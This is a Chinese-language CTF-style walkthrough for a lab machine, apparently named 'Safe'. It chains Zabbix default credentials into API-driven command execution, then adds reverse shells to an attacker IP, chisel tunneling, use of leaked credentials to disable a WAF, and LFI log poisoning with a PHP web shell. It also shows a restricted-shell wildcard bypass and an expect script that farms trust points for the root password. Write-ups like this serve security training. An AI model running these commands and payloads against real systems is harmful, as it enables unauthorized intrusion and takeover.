# 信息收集

```bash
IP=192.168.205.183
nmap -sV -sC -p0-65535 $IP
```

五个端口，信息量不小。

```
PORT      STATE SERVICE
22/tcp    open  ssh        OpenSSH 10.0
80/tcp    open  http       Apache/2.4.66 (Unix)
82/tcp    open  http       Apache/2.4.66 (Unix)
8081/tcp  open  http       Zabbix 7.0
65443/tcp open  http       Tengine
```

80 端口是个内部门户页面，标题写着 "MazeSec Internal Security Portal"。页面内容很长，夹杂大量安全公告，当时细读了一遍，里面埋了不少关键信息：

- 所有 SSH 会话被 `shell-wrapper-v2` 严格监控
- 用户 `0x00` 登录后必须立即执行 `date` 进行时钟同步验证
- 累计 100+ 次 verified routine operations 可获得 elevated administrative logs
- 审计痕迹导出到 `/var/log/audit.log`

这些当时看着像废话，后面全用上了。

82 端口直接访问返回 466 状态码，是雷池 WAF（SafeLine）的拦截页面。背后有 Web 服务但被 WAF 挡着。

8081 端口是 Zabbix 7.0 的登录页面，Docker 部署。

65443 是 Tengine，雷池 WAF 的反向代理入口。

# Zabbix 默认凭据拿容器 Shell

8081 端口的 Zabbix 试了默认凭据 `Admin:zabbix`，直接进去了。

Zabbix 7.0 可以通过 API 更新 script 并执行命令。但这里有个问题：请求经过了雷池 WAF，包含 `bash`、`/etc/passwd` 之类特征的 payload 会被拦成 403。不过像 `id`、`ls` 这类无害命令能过。

策略是分步走：先用 wget 下载反弹 shell 脚本，再执行。

Kali 上准备反弹 shell 文件和监听：

```bash
echo -e '#!/bin/sh\nbash -i >& /dev/tcp/192.168.205.128/8888 0>&1' > /tmp/z
cd /tmp && python3 -m http.server 80
nc -lvnp 8888
```

然后用 Python 脚本通过 Zabbix API 分步执行，保存为 `zabbix_rce.py`：

```python
import requests

URL = "http://192.168.205.183:8081/api_jsonrpc.php"
HDR = {"Content-Type": "application/json-rpc"}

r = requests.post(URL, headers=HDR, json={"jsonrpc": "2.0", "method": "user.login", "params": {"username": "Admin", "password": "zabbix"}, "id": 1})
token = r.json()["result"]

def upd_exec(cmd, idx=0):
    requests.post(URL, headers=HDR, json={"jsonrpc": "2.0", "method": "script.update", "params": {"scriptid": "1", "command": cmd, "execute_on": 2}, "auth": token, "id": 100+idx})
    r = requests.post(URL, headers=HDR, json={"jsonrpc": "2.0", "method": "script.execute", "params": {"scriptid": "1", "hostid": "10084"}, "auth": token, "id": 200+idx})
    print(r.text[:200])

upd_exec("wget -O /tmp/z http://192.168.205.128/z", idx=0)
upd_exec("chmod 777 /tmp/z", idx=1)
upd_exec("sh /tmp/z", idx=2)
```

```bash
python3 zabbix_rce.py
```

监听端收到 shell，`uid=1997(zabbix)`，身处 Docker 容器 `2dd0e7252ced` 内，Alpine Linux。

```bash
cat /var/lib/zabbix/user.txt
```

```
flag{user-764fed0c9dca7bb3d739d2940e3a6f74}
```

# 容器内信息收集与雷池凭据

## 环境变量

```bash
env
```

拿到数据库连接信息 `MYSQL_USER=zabbix` / `MYSQL_PASSWORD=zabbixpwd`，但更重要的发现在别处。

## 发现雷池 WAF 管理后台密码

用 [CDK](https://github.com/cdk-team/CDK) 做了一次全盘扫描，在 `/var/lib/zabbix/log` 里发现了雷池 WAF 的初始化日志：

```bash
cat /var/lib/zabbix/log
```

```
safeline-mgt resetadmin
[INFO] Initial username：admin
[INFO] Initial password：2YlM1xtj
[INFO] Done
```

这就是雷池管理后台的凭据。

## 建立 SOCKS 隧道

雷池管理后台监听在 `172.18.0.1:9443`，从外部直接访问不到，需要通过容器建隧道。

Kali 上启动 chisel server：

```bash
./chisel server -p 9999 --reverse
```

容器内下载并运行 chisel client：

```bash
wget -O /tmp/chisel http://192.168.205.128/chisel
chmod +x /tmp/chisel
./chisel client 192.168.205.128:9999 R:0.0.0.0:1080:socks &
```

## 关闭 WAF 防护

Firefox 设置 SOCKS5 代理 `127.0.0.1:1080`，访问 `https://172.18.0.1:9443`，用 `admin` / `2YlM1xtj` 登录雷池管理后台。

进去后把两个防护应用的模式从"防护"改成"观察"模式。这样 82 端口的请求不再被拦截。

# LFI 到宿主机 RCE

## server-status 泄露

WAF 关闭后，82 端口终于能正常访问了。

```bash
curl http://$IP:82/server-status
```

server-status 页面暴露了完整的 Apache 信息：Apache/2.4.66 + PHP/8.2.30，VHost 是 `localhost:81`。更关键的是能看到有个 `index.php`。

## 发现 LFI 参数

直接访问 82 端口根路径返回 "welcome"，7 个字节。试了 `file`、`page`、`include` 等常见参数名都没变化，用 wfuzz 爆破参数名，最终找到参数是 `p`：

```bash
curl "http://$IP:82/?p=/etc/passwd"
```

成功读取宿主机 `/etc/passwd`，里面有个关键用户：

```
0x00:x:1000:1000::/home/0x00:/usr/local/bin/shell-wrapper
```

这个用户的 login shell 不是 `/bin/bash` 而是 `/usr/local/bin/shell-wrapper`，跟 80 端口首页提到的 "shell-wrapper-v2" 对上了。先记着，后面肯定要处理。

## 读取 Apache 配置

```bash
curl "http://$IP:82/?p=/etc/apache2/httpd.conf"
```

关键信息：DocumentRoot 是 `/var/www/localhost/htdocs`，监听 80 端口和 `127.0.0.1:81`，CGI 模块被注释掉。

```bash
curl "http://$IP:82/?p=/var/www/logs/error.log"
```

error.log 能读到内容，说明日志路径在 `/var/www/logs/`。

## 日志投毒

既然 LFI 能包含任意文件并执行其中的 PHP 代码（因为是 PHP 的 `include/file_get_contents` 实现的），而 Apache access.log 又可读，那就是经典的日志投毒路线。往 User-Agent 注入 PHP 代码，再通过 LFI 包含 access.log 触发执行。

80 端口直连宿主机 Apache，不经过 WAF，注入不会被拦：

```bash
curl -A "<?php system(\$_GET['c']); ?>" http://$IP:80/nonexist
```

通过 82 端口 LFI 包含 access.log：

```bash
curl -s "http://$IP:82/?p=/var/www/logs/access.log&c=id" --output -
```

输出里看到 `uid=104(apache) gid=106(apache)`，RCE 确认。

## 反弹 Shell

Kali 上准备：

```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/192.168.205.128/8888 0>&1' > /tmp/r.sh
python3 -m http.server 80
nc -lvnp 8888
```

通过日志投毒执行：

```bash
curl -s "http://$IP:82/?p=/var/www/logs/access.log&c=wget+-O+/tmp/r+http://192.168.205.128/r.sh" --output -
curl -s "http://$IP:82/?p=/var/www/logs/access.log&c=bash+/tmp/r" --output -
```

拿到宿主机 apache 用户的 shell。

# 提权到 0x00

## 找到密码

```bash
cat /home/0x00/my_pass
```

```
0O1XC7u6Ub18naf2
```

## 分析 shell-wrapper

前面读 `/etc/passwd` 的时候已经注意到 0x00 的 login shell 是 `/usr/local/bin/shell-wrapper`，结合 80 端口首页反复提到 "shell-wrapper-v2" 监控 SSH 会话、要求登录后立即执行 `date`，这个二进制肯定是绕不过去的关卡。

看一下它的属性：

```bash
ls -la /usr/local/bin/shell-wrapper
```

```
-rwsr-sr-x 1 root root 18416 /usr/local/bin/shell-wrapper
```

SUID root。把它 scp 回 Kali 用 IDA 打开，反编译结果非常简单：

```c
int main() {
    setuid(0);
    execl("/usr/bin/python3", "python3", "/usr/local/bin/.shell.py", 0);
    return 0;
}
```

它以 root 权限执行 `.shell.py`。`.shell.py` 权限是 `-rwx--x--x`，只可执行不可读。从 SSH 登录后的实际行为来看，这个 Python 脚本实现了一个命令监控 shell：先显示 banner 和 "System Security Audit: ENABLED"，等待用户输入，对 `date` 放行，对 `id`、`bash`、`find`、`cat` 等命令标记为 Warning 甚至直接断开连接。

## 绕过命令过滤

SSH 登录后，先输入 `date` 通过初始化验证，然后用通配符绕过关键字检测：

```bash
ssh 0x00@$IP
```

```
date
/bin/bas?
```

`/bin/bas?` 匹配到 `/bin/bash`，但不包含完整的 "bash" 字符串，成功绕过 `.shell.py` 的过滤规则，拿到 0x00 的 bash shell。

```
uid=1000(0x00) gid=1000(0x00) groups=1000(0x00)
```

# 提权到 root

## 信任积分机制

回到 80 端口首页的提示：累计 100+ 次 verified routine operations 可获得 elevated administrative logs，审计痕迹导出到 `/var/log/audit.log`。

看了一下这个文件：

```bash
ls -la /var/log/audit.log
```

```
-rw-rw-rw- 1 0x00 0x00 0 /var/log/audit.log
```

空文件，属于 0x00 用户。思路很明确：在 shell-wrapper 的原始提示符里反复执行 `date` 刷够 100 次信任积分，让 `.shell.py` 把提权信息写入这个文件。

必须在 wrapper 里执行而不是在绕过后的 bash 里，因为只有 `.shell.py` 才维护信任计分。

用 expect 自动化这个过程，保存为 `trust.exp`：

```
set timeout 10
spawn ssh 0x00@192.168.205.183
expect "password:"
send "0O1XC7u6Ub18naf2\r"
expect "0x00@Safe"
for {set i 0} {$i < 120} {incr i} {
    send "date\r"
    expect "0x00@Safe"
}
interact
```

```bash
expect trust.exp
```

跑完 120 次 date 之后，进 bash 检查：

```
/bin/bas?
cat /var/log/audit.log
```

```
System trust verified. Root password: [MzeSec_P@ss_2026]
```

直接 su：

```bash
su -
```

密码 `MzeSec_P@ss_2026`。

```
root@Safe:~#
```

# Flag

```bash
cat /root/root.txt /home/0x00/user.txt
```

```
flag{root-8988b12255d2791fe2668532c88a0513}
flag{user-764fed0c9dca7bb3d739d2940e3a6f74}
```